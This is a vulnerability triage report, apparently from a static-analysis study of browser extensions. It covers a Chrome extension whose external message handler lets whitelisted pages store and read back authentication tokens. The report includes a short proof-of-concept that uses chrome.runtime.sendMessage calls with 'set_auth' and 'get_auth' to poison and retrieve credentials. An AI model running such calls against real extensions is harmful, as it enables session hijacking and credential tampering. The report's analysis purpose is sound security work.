# CoCo Analysis: hdjgclfpeegcmgndglilkhlhjjjcheeh

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (token)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hdjgclfpeegcmgndglilkhlhjjjcheeh/opgen_generated_files/bg.js
Line 965    chrome.runtime.onMessageExternal.addListener((function(e,t,r){
                ...
                "set_auth"===(null==e?void 0:e.message)&&(""!==e.token?
                chrome.storage.local.set({hc_ext_refresh_token:JSON.stringify({token:e.token,email:e.email,refreshToken:e.refreshToken})})
```

**Code:**

```javascript
// Background script (bg.js Line 965) - minified, deobfuscated for clarity
chrome.runtime.onMessageExternal.addListener((function(e, t, r) {
    // Message: "installed"
    if ("installed" === (null == e ? void 0 : e.message)) {
        r(!0);  // sendResponse(true)
    }

    // Message: "set_auth"
    if ("set_auth" === (null == e ? void 0 : e.message)) {
        if ("" !== e.token) {
            chrome.storage.local.set({
                hc_ext_refresh_token: JSON.stringify({
                    token: e.token,              // ← attacker-controlled
                    email: e.email,              // ← attacker-controlled
                    refreshToken: e.refreshToken // ← attacker-controlled
                })
            });
        } else {
            chrome.storage.local.remove(["hc_ext_refresh_token"]);
        }
        r(!0);  // sendResponse(true)
    }

    // Message: "get_auth"
    if ("get_auth" === (null == e ? void 0 : e.message)) {
        chrome.storage.local.get(["hc_ext_refresh_token"]).then((function(e) {
            r(e.hc_ext_refresh_token);  // ← sends stored credentials back to attacker
        }));
    }

    return !0;
}));
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Attacker from whitelisted domain (app.hypercomply.com or *.stag.hypercomply.com)
// Step 1: Poison the storage with malicious credentials
chrome.runtime.sendMessage(
    "hdjgclfpeegcmgndglilkhlhjjjcheeh",  // extension ID
    {
        message: "set_auth",
        token: "attacker_token",
        email: "attacker@evil.com",
        refreshToken: "attacker_refresh_token"
    },
    function(response) {
        console.log("Storage poisoned:", response);
    }
);

// Step 2: Retrieve the poisoned credentials
chrome.runtime.sendMessage(
    "hdjgclfpeegcmgndglilkhlhjjjcheeh",
    { message: "get_auth" },
    function(response) {
        console.log("Retrieved poisoned credentials:", response);
        // Response contains: {token, email, refreshToken}
    }
);
```

**Impact:** Complete storage exploitation chain. An attacker on whitelisted domains (app.hypercomply.com or staging subdomains) can poison the extension's authentication credentials and retrieve them back via the "get_auth" message. This allows session hijacking and credential manipulation for the HyperComply service.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (email)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hdjgclfpeegcmgndglilkhlhjjjcheeh/opgen_generated_files/bg.js
Line 965    e.email (as part of JSON.stringify)
```

**Classification:** TRUE POSITIVE

**Reason:** Same vulnerability as Sink 1, targeting the email field within the authentication object. Part of the same complete storage exploitation chain.

---

## Sink 3: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (refreshToken)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hdjgclfpeegcmgndglilkhlhjjjcheeh/opgen_generated_files/bg.js
Line 965    e.refreshToken (as part of JSON.stringify)
```

**Classification:** TRUE POSITIVE

**Reason:** Same vulnerability as Sink 1, targeting the refreshToken field within the authentication object. Part of the same complete storage exploitation chain. The refresh token is particularly sensitive as it can be used to obtain new access tokens.
